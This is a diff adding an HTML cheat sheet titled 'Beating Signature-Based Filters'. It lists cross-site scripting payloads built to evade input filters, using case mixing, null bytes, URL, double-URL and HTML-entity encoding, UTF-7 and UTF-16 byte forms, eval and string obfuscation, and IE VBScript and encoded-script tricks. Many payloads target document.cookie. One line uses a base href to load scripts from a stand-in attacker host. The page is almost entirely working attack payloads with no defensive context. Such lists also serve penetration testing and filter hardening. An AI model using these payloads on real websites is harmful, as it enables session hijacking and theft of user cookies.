@@ -1,0 +1,113 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Beating Signature-Based Filters</title>
+</head><body><b>Basic</b><br/>
+<br/>
+&quot;<tt><span style="font-size: 10pt">&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;<br/>
+</span></tt><tt><span style="font-size: 10pt">&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;<br/>
+&quot;%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br/>
+&quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;<br/>
+%00&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>
+</span></tt><tt><span style="font-size: 10pt">&lt;script/anyjunk&gt;alert(1)&lt;/script&gt;</span></tt><br/>
+<b><br/>
+</b><b>OBFUSCATION METHODS </b>of <tt>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</tt><br/>
+<br/>
+<b>Bypassing Filters: HTML</b><br/>
+<tt><br/>
+&lt;iMg onerror=alert(1) src=a&gt;<br/>
+&lt;[%00]img onerror=alert(1) src=a&gt;<br/>
+&lt;i[%00]mg onerror=alert(1) src=a&gt;<br/>
+&lt;x onclick=alert(1) src=a&gt;Click here&lt;/x&gt; (arbitrary tag name)<br/>
+<br/>
+</tt>set base URL for all relative URL in page <br/>
+<tt>&lt;base href=”http://mdattacker.net/badscripts/”&gt;<br/>
+...<br/>
+&lt;script src=”goodscript.js”&gt;&lt;/script&gt;<br/>
+<br/>
+&lt;img/onerror=alert(1) src=a&gt;<br/>
+&lt;img[%09]onerror=alert(1) src=a&gt;<br/>
+&lt;img[%0d]onerror=alert(1) src=a&gt;<br/>
+&lt;img[%0a]onerror=alert(1) src=a&gt;<br/>
+&lt;img/&quot;onerror=alert(1) src=a&gt;<br/>
+&lt;img/'onerror=alert(1) src=a&gt;<br/>
+&lt;img/anyjunk/onerror=alert(1) src=a&gt;<br/>
+&lt;img o[%00]nerror=alert(1) src=a&gt;<br/>
+&lt;img onerror=&quot;alert(1)&quot;src=a&gt;<br/>
+&lt;img onerror='alert(1)'src=a&gt;<br/>
+</tt><tt>&lt;img onerror=`alert(1)`src=a&gt;</tt><br/>
+<tt>&lt;img src=`a`onerror=alert(1)&gt;<br/>
+&lt;img/onerror=&quot;alert(1)&quot;src=a&gt;<br/>
+&lt;img onerror=a[%00]lert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#x6c;ert(1) src=a&gt;<br/>
+</tt><br/>
+HTML encoding<tt><br/>
+</tt><tt>&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;1&amp;#x29; &gt;<br/>
+&lt;img onerror=a&amp;#x06c;ert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#x006c;ert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#x0006c;ert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#108;ert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#0108;ert(1) src=a&gt;<br/>
+&lt;img onerror=a&amp;#108ert(1) src=a&gt;<br/>
+</tt><tt>&lt;img onerror=a&amp;#0108ert(1) src=a&gt;</tt><br/>
+<br/>
+Double URLencode<br/>
+<tt>%253cimg%20onerror=alert(1)%20src=a%253e</tt><br/>
+<br/>
+<tt>«img onerror=alert(1) src=a»<br/>
+</tt><tt>&lt;&lt;script&gt;alert(1);//&lt;&lt;/script&gt;</tt><br/>
+<tt>&lt;script&lt;{alert(1)}/&gt;&lt;/script&gt;</tt><br/>
+<br/>
+Different character sets (attacker must control Content-Type header or metatag or charset parameter)<br/>
+UTF-7<br/>
+<tt>+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-<br/>
+<br/>
+</tt>US-ASCII<br/>
+<tt>BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F 	; 1⁄4script3⁄4alert(do<br/>
+63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F 	; cument.cookie)1⁄4/<br/>
+</tt><tt>73 63 72 69 70 74 BE              	; script3⁄4</tt><br/>
+<br/>
+UTF-16<br/>
+<tt>FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ&lt;.s.c.r.i.p.t.<br/>
+3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; &gt;.a.l.e.r.t.(.d.<br/>
+6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...<br/>
+63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).&lt;.<br/>
+</tt><tt>2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.&gt;.</tt><br/>
+<br/>
+<b>Bypassing Filters: Script Code</b><br/>
+<br/>
+iframe tag content doesn't inherit parent JavaScript filtering code!<br/>
+<br/>
+<tt>&lt;script&gt;a\u006cert(1);&lt;/script&gt;<br/>
+&lt;script&gt;eval(‘a\u006cert(1)’);&lt;/script&gt; (Unicode escapes)<br/>
+&lt;script&gt;eval(‘a\x6cert(1)’);&lt;/script&gt; (HEX escapes)<br/>
+&lt;script&gt;eval(‘a\154ert(1)’);&lt;/script&gt; (OCT escapes)<br/>
+&lt;script&gt;eval(‘a\l\ert\(1\)’);&lt;/script&gt;<br/>
+<br/>
+&lt;script&gt;eval(‘al’+’ert(1)’);&lt;/script&gt;<br/>
+&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41));&lt;/script&gt;<br/>
+&lt;script&gt;eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));&lt;/script&gt;<br/>
+<br/>
+&lt;script&gt;'alert(1)'.replace(/.+/,eval)&lt;/script&gt;<br/>
+&lt;script&gt;function::['alert'](1)&lt;/script&gt;<br/>
+<br/>
+&lt;script&gt;alert(document['cookie'])&lt;/script&gt;<br/>
+&lt;script&gt;with(document)alert(cookie)&lt;/script&gt;<br/>
+<br/>
+</tt>VBscripts (works on IE)<br/>
+<tt>&lt;script language=vbs&gt;MsgBox 1&lt;/script&gt;<br/>
+&lt;img onerror=&quot;vbs:MsgBox 1&quot; src=a&gt;<br/>
+&lt;img onerror=MsgBox+1 language=vbs src=a&gt;<br/>
+&lt;SCRIPT LANGUAGE=VBS&gt;MSGBOX 1&lt;/SCRIPT&gt;<br/>
+&lt;IMG ONERROR=”VBS:MSGBOX 1” SRC=A&gt;<br/>
+<br/>
+</tt>VBScript + JavaScript<br/>
+<tt>&lt;script&gt;execScript(“MsgBox 1&quot;,&quot;vbscript&quot;);&lt;/script&gt;<br/>
+&lt;script language=vbs&gt;execScript(&quot;alert(1)&quot;)&lt;/script&gt;<br/>
+&lt;SCRIPT LANGUAGE=VBS&gt;EXECSCRIPT(LCASE(&quot;ALERT(1)&quot;)) &lt;/SCRIPT&gt;<br/>
+</tt><tt>&lt;IMG ONERROR=&quot;VBS:EXECSCRIPT LCASE('ALERT(1)')&quot; SRC=A&gt;</tt><br/>
+<br/>
+Using Encoded Scripts (IE)<br/>
+<tt>&lt;img onerror=&quot;VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&quot; src=a&gt;<br/>
+&lt;img language=&quot;JScript.Encode” onerror=&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot; src=a&gt;<br/>
+</tt></body></html>
